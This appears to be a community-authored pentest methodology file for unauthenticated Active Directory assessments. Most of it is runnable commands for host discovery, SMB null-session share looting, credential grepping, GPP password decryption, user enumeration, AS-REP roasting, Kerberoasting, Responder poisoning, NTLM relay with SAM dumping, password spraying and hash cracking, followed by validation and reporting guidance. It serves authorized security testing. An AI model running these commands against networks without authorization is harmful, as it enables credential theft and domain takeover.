---
name: unauth-infra-ad-pentest
l0: Unauthenticated infrastructure pentest with AD focus — host discovery, SMB enumeration, null-session attacks, AS-REP roasting, Kerberoasting.
license: MIT
metadata:
  version: "1.0.0"
  author: community
  tags: ["pentest", "infrastructure", "active-directory", "smb", "kerberos", "unauthenticated"]
---

## L1 — Overview

An unauthenticated infrastructure pentest simulates an attacker with no credentials and no prior access — starting only from network reachability. The primary goal is to determine how far an attacker can get before obtaining any credentials, and whether AD misconfigurations allow privilege escalation from zero.

**Use this context when:**
- Starting a black-box or unauthenticated internal network pentest
- The scope includes Active Directory and Windows infrastructure
- No credentials have been provided (or testing pre-auth attack surface)
- Assessing SMB exposure, null sessions, and Kerberos pre-auth weaknesses

**Key focus areas:**
- Host and port discovery (Nmap)
- SMB null session access and share enumeration
- AD user enumeration without credentials
- AS-REP Roasting (users without Kerberos pre-auth)
- Kerberoasting (service accounts with SPNs)
- Offline hash cracking

**Out of scope for this context:** Post-exploitation, lateral movement after credential gain, authenticated enumeration beyond initial foothold.

**Typical engagement flow:** Discover → Enumerate SMB → Enumerate AD → Attack Kerberos → Crack → Report

---

## L2 — Full Methodology

---

### Phase 1 — Host Discovery

Goal: Build a complete map of live hosts before touching any specific service.

#### 1.1 Ping sweep (fast, wide)
```bash
# ICMP sweep — works when ICMP is allowed
nmap -sn -PE -T4 --min-parallelism 100 10.0.0.0/24 -oA discovery/ping_sweep

# If ICMP is blocked, use ARP (local subnet only, requires root)
nmap -sn -PR 10.0.0.0/24 -oA discovery/arp_sweep

# TCP-based host discovery (SYN to 80/443 — bypasses ICMP blocks)
nmap -sn -PS80,443,445,3389 10.0.0.0/24 -oA discovery/tcp_sweep
```

#### 1.2 Extract live hosts
```bash
grep "Up" discovery/ping_sweep.gnmap | awk '{print $2}' > live_hosts.txt
wc -l live_hosts.txt  # confirm count
```

#### 1.3 OS fingerprinting pass
```bash
nmap -O --osscan-guess -iL live_hosts.txt -T4 -oA discovery/os_guess
```

**Note:** Windows hosts often block ICMP but respond to TCP 445. Always combine methods.

---

### Phase 2 — Port and Service Enumeration

Goal: Full service map on all live hosts. Identify DCs, member servers, workstations.

#### 2.1 Full TCP port scan (all ports)
```bash
# Fast SYN scan — all 65535 ports
nmap -sS -p- -T4 --min-rate 5000 -iL live_hosts.txt -oA scans/full_tcp

# Follow up with version + script scan on open ports only
nmap -sV -sC -p $(grep open scans/full_tcp.gnmap | grep -oP '\d+/open' | cut -d/ -f1 | sort -u | tr '\n' ',') \
  -iL live_hosts.txt -oA scans/services
```

#### 2.2 Key port identification
```bash
# Extract hosts by service — used to target later phases
grep "445/open" scans/full_tcp.gnmap | awk '{print $2}' > targets/smb_hosts.txt
grep "88/open"  scans/full_tcp.gnmap | awk '{print $2}' > targets/kerberos_hosts.txt  # Domain Controllers
grep "389/open" scans/full_tcp.gnmap | awk '{print $2}' > targets/ldap_hosts.txt      # Domain Controllers
grep "3389/open" scans/full_tcp.gnmap | awk '{print $2}' > targets/rdp_hosts.txt
grep "5985/open" scans/full_tcp.gnmap | awk '{print $2}' > targets/winrm_hosts.txt
```

#### 2.3 UDP scan (targeted — UDP is slow)
```bash
# Only run on DC candidates — LDAP/DNS/Kerberos UDP
nmap -sU -p 53,88,123,137,389,636 --open -iL targets/kerberos_hosts.txt -oA scans/udp_dc
```

#### 2.4 DC identification
A Domain Controller typically exposes all of: 53 (DNS), 88 (Kerberos), 135, 139, 389 (LDAP), 445 (SMB), 464 (kpasswd), 636 (LDAPS), 3268 (Global Catalog), 3269 (GC over SSL).

```bash
# Quick DC fingerprint
nmap -p 53,88,389,445,3268 --open -iL live_hosts.txt -oA scans/dc_candidates
```

---

### Phase 3 — SMB Enumeration

Goal: Identify accessible shares, read sensitive files, and extract any credentials or config data from null or guest sessions.

#### 3.1 Check for null and guest session access
```bash
# Test null session (no creds)
crackmapexec smb targets/smb_hosts.txt -u '' -p '' --shares 2>/dev/null | tee smb/null_session_shares.txt

# Test guest session
crackmapexec smb targets/smb_hosts.txt -u 'guest' -p '' --shares 2>/dev/null | tee smb/guest_session_shares.txt

# smbclient per-host check
while read ip; do
  echo "=== $ip ==="
  smbclient -N -L //$ip 2>/dev/null
done < targets/smb_hosts.txt | tee smb/smbclient_null.txt
```

#### 3.2 Access readable shares
```bash
# Connect to a specific readable share
smbclient -N //<IP>/ShareName

# Recursively list all files in a share (null session)
smbclient -N //<IP>/ShareName -c 'recurse ON; ls' 2>/dev/null

# Download everything from an accessible share
smbclient -N //<IP>/ShareName -c 'prompt OFF; recurse ON; mget *' 2>/dev/null
```

#### 3.3 Unusual shares and sensitive paths to check
Flag these share names as high-priority:
- `SYSVOL`, `NETLOGON` — GPO files, logon scripts, sometimes hardcoded creds
- `backup`, `backups`, `bkp` — database dumps, config exports
- `it`, `admin`, `scripts`, `tools` — internal tooling, sometimes credentials
- `share`, `public`, `files`, `data` — catch-all shares often overpermissioned
- Any non-default share name (anything other than C$, ADMIN$, IPC$, print$)

```bash
# In smbclient — look for these file types
find . -name "*.xml" -o -name "*.conf" -o -name "*.config" \
       -o -name "*.ini" -o -name "*.txt" -o -name "*.ps1" \
       -o -name "*.bat" -o -name "*.vbs" -o -name "*.zip" \
       -o -name "*.bak" -o -name "*.sql" -o -name "web.config" \
       -o -name "*.pfx" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

#### 3.4 SYSVOL / GPO credential hunting
```bash
# Mount SYSVOL and search for cpassword (Group Policy Preferences — decryptable)
smbclient -N //dc-ip/SYSVOL -c 'recurse ON; ls'

# Look for Groups.xml, Services.xml, ScheduledTasks.xml — these contain encrypted passwords
# Decrypt cpassword values found in GPP files
gpp-decrypt '<cpassword value>'
```

#### 3.5 SMB vulnerability checks
```bash
# Check for EternalBlue (MS17-010) — do not exploit without explicit scope approval
nmap -p 445 --script smb-vuln-ms17-010 -iL targets/smb_hosts.txt -oA smb/eternalblue

# Check for SMBv1 (sign of old / unpatched systems)
nmap -p 445 --script smb-security-mode -iL targets/smb_hosts.txt | grep -i "message_signing\|SMBv1"

# Check signing enforcement (prerequisite for relay attacks)
crackmapexec smb targets/smb_hosts.txt --gen-relay-list smb/relay_candidates.txt
```

---

### Phase 4 — SMB Share Content Analysis

Goal: Analyse downloaded files for credentials, hashes, connection strings, and sensitive data.

#### 4.1 Credential patterns (grep across all downloaded files)
```bash
# Run from the directory where you downloaded share contents
grep -riE "password\s*=|pwd\s*=|pass\s*=|passwd\s*=" . 2>/dev/null
grep -riE "connectionstring|datasource|initial catalog" . 2>/dev/null
grep -riE "username\s*=|user\s*=|uid\s*=" . 2>/dev/null

# AWS / cloud keys
grep -riE "AKIA[0-9A-Z]{16}" . 2>/dev/null
grep -riE "-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----" . 2>/dev/null

# NT hashes pattern
grep -riE "[a-f0-9]{32}:[a-f0-9]{32}" . 2>/dev/null
```

#### 4.2 Specific file types
```bash
# web.config — ASP.NET connection strings
grep -i "connectionString\|password\|pwd" */web.config 2>/dev/null

# PowerShell scripts — hardcoded creds, encoded commands
grep -iE "ConvertTo-SecureString|password|credential" **/*.ps1 2>/dev/null
base64 -d <<< "<encoded payload>" 2>/dev/null  # decode any -EncodedCommand values

# Database files — extract strings
strings *.mdb *.accdb *.sqlite 2>/dev/null | grep -iE "password|user|admin"
```

---

### Phase 5 — AD Enumeration (Unauthenticated)

Goal: Extract domain users, groups, and policies without credentials — using RPC null sessions and LDAP anonymous bind.

#### 5.1 enum4linux (fast mode)
```bash
# Fast enumeration — null session
enum4linux -a <DC-IP> 2>/dev/null | tee enum4linux/dc_fast.txt

# Targeted: users only
enum4linux -U <DC-IP> 2>/dev/null | tee enum4linux/users.txt

# Targeted: groups
enum4linux -G <DC-IP> 2>/dev/null | tee enum4linux/groups.txt

# Targeted: password policy (important for spray thresholds)
enum4linux -P <DC-IP> 2>/dev/null | tee enum4linux/policy.txt
```

#### 5.2 enum4linux-ng (modern replacement, better output)
```bash
enum4linux-ng -A <DC-IP> -oA enum4linux/dc_full
```

#### 5.3 RPC null session — manual
```bash
# Connect via rpcclient with null session
rpcclient -U "" -N <DC-IP>

# Inside rpcclient:
enumdomusers          # list all domain users
enumdomgroups         # list all domain groups
querydominfo          # domain info, user count, lockout policy
getdompwinfo          # password policy
enumprinters          # sometimes reveals service accounts
```

#### 5.4 LDAP anonymous bind
```bash
# Test if anonymous LDAP bind is allowed
ldapsearch -x -H ldap://<DC-IP> -b "" -s base namingContexts 2>/dev/null

# If allowed — dump all users
ldapsearch -x -H ldap://<DC-IP> \
  -b "DC=domain,DC=local" \
  "(objectClass=user)" \
  sAMAccountName userPrincipalName memberOf \
  2>/dev/null | tee ldap/users_anon.txt

# Extract just usernames
grep "sAMAccountName:" ldap/users_anon.txt | awk '{print $2}' > targets/userlist.txt
```

#### 5.5 Username enumeration via Kerberos (no creds needed)
```bash
# Kerbrute — validate usernames against Kerberos (no lockout risk on most configs)
kerbrute userenum --dc <DC-IP> -d domain.local /usr/share/wordlists/usernames.txt \
  -o kerbrute/valid_users.txt

# Also try common username formats if you have a staff list or OSINT names:
# firstname.lastname, flastname, firstnamel, etc.
```

---

### Phase 6 — AS-REP Roasting

Goal: Retrieve TGT hashes for accounts that have Kerberos pre-authentication disabled. These can be cracked offline.

#### 6.1 Check and retrieve AS-REP hashes (no creds)
```bash
# impacket — no credentials needed
GetNPUsers.py domain.local/ -usersfile targets/userlist.txt \
  -no-pass -dc-ip <DC-IP> \
  -outputfile asrep/hashes.txt \
  -format hashcat

# If you have no userlist, try with just the domain (works if null session allowed)
GetNPUsers.py domain.local/ -no-pass -dc-ip <DC-IP> -request
```

#### 6.2 Identify AS-REP vulnerable accounts
Accounts with `DONT_REQUIRE_PREAUTH` flag set in `userAccountControl` are vulnerable. Often misconfigured service accounts or legacy accounts.

#### 6.3 Crack AS-REP hashes offline
```bash
# Hashcat — mode 18200 for AS-REP
hashcat -m 18200 asrep/hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule \
  -o asrep/cracked.txt

# john fallback
john --format=krb5asrep asrep/hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Phase 7 — Kerberoasting

Goal: Request TGS tickets for accounts with SPNs registered, then crack them offline. Requires a valid domain account — attempt only if credentials were found in SMB/file analysis, or via AS-REP cracking.

#### 7.1 Enumerate Kerberoastable accounts (unauthenticated LDAP, if anon bind works)
```bash
# Via LDAP anonymous bind — look for accounts with servicePrincipalName set
ldapsearch -x -H ldap://<DC-IP> \
  -b "DC=domain,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName \
  2>/dev/null | tee ldap/spn_accounts.txt
```

#### 7.2 Kerberoast with valid credentials (from earlier phases)
```bash
# impacket — request TGS for all SPN accounts
GetUserSPNs.py domain.local/username:password \
  -dc-ip <DC-IP> \
  -request \
  -outputfile kerberoast/tgs_hashes.txt

# If only NTLM hash available (pass-the-hash variant)
GetUserSPNs.py domain.local/username \
  -hashes :<NTLM-hash> \
  -dc-ip <DC-IP> \
  -request \
  -outputfile kerberoast/tgs_hashes.txt
```

#### 7.3 Crack TGS hashes offline
```bash
# Hashcat — mode 13100 for Kerberoast (RC4), 19600 for AES128, 19700 for AES256
hashcat -m 13100 kerberoast/tgs_hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule \
  -o kerberoast/cracked.txt

# john fallback
john --format=krb5tgs kerberoast/tgs_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Note:** AES256 (etype 18) hashes crack significantly slower than RC4 (etype 23). RC4 is still common on older domains.

---

### Phase 8 — Additional Unauthenticated Checks

These are often missed but valuable at the zero-credential stage.

#### 8.1 LDAP signing and channel binding
```bash
# Check if LDAP signing is enforced (important for relay attack viability)
nmap -p 389 --script ldap-rootdse <DC-IP>
```

#### 8.2 LLMNR / NBT-NS Poisoning with Responder (background)

Goal: Passively poison name resolution broadcasts on the local segment to capture NTLMv1/v2 challenge-response hashes from any host that fails DNS resolution. Run this in the background from engagement start — it captures hashes opportunistically while other phases run in parallel.

**How it works:** When a Windows host can't resolve a name via DNS, it falls back to LLMNR (UDP 5355) and NBT-NS (UDP 137) — broadcasting the query to the whole subnet. Responder answers those broadcasts claiming to be the target, triggering NTLM authentication, and capturing the hash.

##### Start Responder in the background (active poisoning)
```bash
# Create log directory
mkdir -p responder/logs

# Run Responder — active mode, all protocols, log to file
# -I   network interface facing the target subnet
# -w   enable WPAD rogue proxy (captures browser auth)
# -d   enable DHCP poisoning replies
# -P   force NTLM auth on WPAD (vs basic auth)
responder -I eth0 -wdP 2>&1 | tee responder/logs/responder.log &

# Confirm it's running
jobs -l
ps aux | grep responder
```

##### Run Responder in a tmux/screen pane (recommended for long engagements)
```bash
# Start a detached tmux session for Responder
tmux new-session -d -s responder \
  "responder -I eth0 -wdP 2>&1 | tee responder/logs/responder_$(date +%Y%m%d_%H%M).log"

# Attach to check on it any time
tmux attach -t responder

# Detach without stopping: Ctrl+B then D
```

##### Monitor captured hashes in real time
```bash
# Watch the Responder log for incoming hashes
tail -f responder/logs/responder.log | grep -i "hash\|NTLMv\|challenge"

# Responder also writes hashes to its own log directory
ls -la /usr/share/responder/logs/
tail -f /usr/share/responder/logs/SMB-NTLMv2-*.txt
```

##### Analyze-only mode (passive — no poisoning, safe for recon phase)
```bash
# Use -A to observe without answering — maps which hosts are broadcasting
responder -I eth0 -A 2>&1 | tee responder/logs/passive_recon.log
```

##### Stop Responder when done
```bash
# If running as background job
kill %1        # or use the job number from `jobs -l`

# If running in tmux
tmux kill-session -t responder
```

##### Crack captured NTLMv2 hashes offline
```bash
# Hashes are in /usr/share/responder/logs/ — copy them out
cp /usr/share/responder/logs/SMB-NTLMv2-*.txt responder/hashes/

# Combine all captured hashes
cat responder/hashes/*.txt | sort -u > responder/hashes/all_ntlmv2.txt

# Hashcat — mode 5600 for NTLMv2
hashcat -m 5600 responder/hashes/all_ntlmv2.txt /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule \
  -o responder/cracked.txt

# Show cracked results
hashcat -m 5600 responder/hashes/all_ntlmv2.txt --show

# john fallback
john --format=netntlmv2 responder/hashes/all_ntlmv2.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt
```

##### NTLMv1 hashes (weaker — if captured)
```bash
# NTLMv1 — mode 5500 in hashcat (much faster to crack)
hashcat -m 5500 responder/hashes/ntlmv1.txt /usr/share/wordlists/rockyou.txt \
  -o responder/cracked_v1.txt

# NTLMv1 can also be cracked via crack.sh (online, rainbow tables) if hashcat fails
```

##### Relay instead of crack — ntlmrelayx (if SMB signing is disabled)
```bash
# Check Phase 3.5 output — if SMB signing is NOT required on target hosts,
# relay the captured hash directly instead of cracking it

# First: disable SMB and HTTP in Responder so it captures but doesn't authenticate
# Edit /etc/responder/Responder.conf:
#   SMB = Off
#   HTTP = Off

# Then run ntlmrelayx targeting hosts without signing (from smb/relay_candidates.txt)
ntlmrelayx.py -tf smb/relay_candidates.txt -smb2support \
  -o ntlmrelayx/relay_output.txt

# Run Responder alongside
responder -I eth0 -wdP

# ntlmrelayx will relay captured auth to targets and attempt:
# - SAM dump (local admin hashes)
# - Automatic socks proxy for further access
```

**Operational notes:**
- Responder should be started at the **beginning of the engagement** and left running throughout — hashes arrive whenever users access network resources, run scripts, or when scheduled tasks fire
- Peak capture windows: **morning logon (08:00–09:30)** and **post-lunch (13:00–14:00)** when users are most active
- WPAD (`-w`) is high-yield in environments with proxy-aware browsers — captures HTTP basic auth and NTLMv2 from browser traffic
- If no hashes arrive after 30 minutes, check: correct interface, L2 adjacency to targets, and whether LLMNR is disabled via GPO (increasingly common on hardened networks)

#### 8.3 DNS zone transfer (often forgotten)
```bash
dig axfr @<DC-IP> domain.local 2>/dev/null | tee dns/zone_transfer.txt
nmap --script dns-zone-transfer -p 53 <DC-IP>
```

#### 8.4 NBT-NS and NetBIOS enumeration
```bash
nbtscan -r 10.0.0.0/24 | tee discovery/nbtscan.txt
nmap -sU -p 137 --script nbstat -iL live_hosts.txt -oA discovery/netbios
```

#### 8.5 RDP and WinRM exposure check
```bash
# Check if NLA is enforced on RDP (no NLA = username enumerable pre-auth)
nmap -p 3389 --script rdp-enum-encryption -iL targets/rdp_hosts.txt

# WinRM — test if accessible
crackmapexec winrm targets/winrm_hosts.txt -u '' -p ''
```

#### 8.6 Password spraying (caution — lockout risk)
```bash
# ALWAYS check password policy first (Phase 5 — enum4linux -P)
# Only spray if lockout threshold is known and you stay well below it

# Spray with one password across all valid users
crackmapexec smb targets/smb_hosts.txt \
  -u targets/userlist.txt \
  -p 'Winter2024!' \
  --continue-on-success \
  2>/dev/null | tee spray/smb_spray.txt

# Kerbrute spray (does not trigger standard lockout on most configs — still check policy)
kerbrute passwordspray --dc <DC-IP> -d domain.local \
  targets/userlist.txt 'Winter2024!'
```

---

### Phase 9 — Validation Gate

Before reporting any finding, confirm all of the following:

- [ ] Reproduced in a clean session (fresh terminal, no cached credentials)
- [ ] Null/guest session confirmed explicitly — not assumed from tool output
- [ ] Cracked hashes verified by re-authenticating with cracked credential
- [ ] AS-REP / Kerberoast hashes are from accounts in scope
- [ ] SMB file access confirmed by actually reading a file — not just seeing the share listed
- [ ] Impact articulated: what can an attacker do with this finding?
- [ ] Evidence captured: full command + output, timestamp, source IP
- [ ] Within agreed engagement scope (IP ranges, domain)

---

### Phase 10 — False Positive Filter

Do not report without further verification:

- **Share listed but not accessible** — listing a share name (e.g. via null session `NetShareEnum`) is not the same as having read access. Always confirm by connecting and reading a file.
- **EternalBlue flagged by Nmap script but unconfirmed** — Nmap's `smb-vuln-ms17-010` has false positive rate; confirm with a safe detection-only check before reporting as exploitable.
- **Hash captured but not cracked** — an uncracked AS-REP or TGS hash is a finding (misconfiguration), but report it as such, not as a credential compromise.
- **LDAP anonymous bind returning empty results** — bind succeeding with 0 results is not the same as useful enumeration; confirm what was actually accessible.
- **Username enumeration via Kerberos error codes** — valid vs invalid account error differentiation is a finding only if you successfully enumerate users, not if the behavior is theoretical.
- **Password spray with no lockout policy confirmed** — do not spray without first confirming the lockout threshold from enumerated policy.

---

### Phase 11 — Reporting Structure

Each finding should follow this structure:

```
Title: <short name, e.g. "SMB Null Session Exposes Sensitive Share">
Severity: Critical / High / Medium / Low / Informational
CVSS (optional): <score>

Summary:
One paragraph — what is the issue and why does it matter.

Evidence:
- Command run
- Sanitised output (truncate large outputs, redact unrelated credentials)
- Screenshot reference if applicable

Impact:
What can an attacker do with this? Be specific — "attacker can read HR salary data" 
not "attacker can access files".

Remediation:
Concrete fix — e.g. "Disable null session access by setting 
RestrictAnonymous = 2 in registry" or "Enable Kerberos pre-authentication 
on all user accounts in ADUC".

References:
- CVE / MS advisory if applicable
- CIS Benchmark / STIG reference if applicable
```

**Standard finding titles for this engagement type:**
- SMB Null Session Enabled
- Guest Account Active on SMB
- Sensitive Files Exposed via SMB Share
- Group Policy Preferences Credentials (MS14-025)
- LDAP Anonymous Bind Permitted
- Domain User Enumeration via RPC Null Session
- AS-REP Roasting — Accounts Without Pre-Authentication
- Kerberoastable Service Accounts with Weak Passwords
- SMBv1 Enabled (Legacy Protocol)
- SMB Signing Not Required (Relay Attack Risk)
- DNS Zone Transfer Permitted
- LLMNR/NBT-NS Poisoning Opportunity
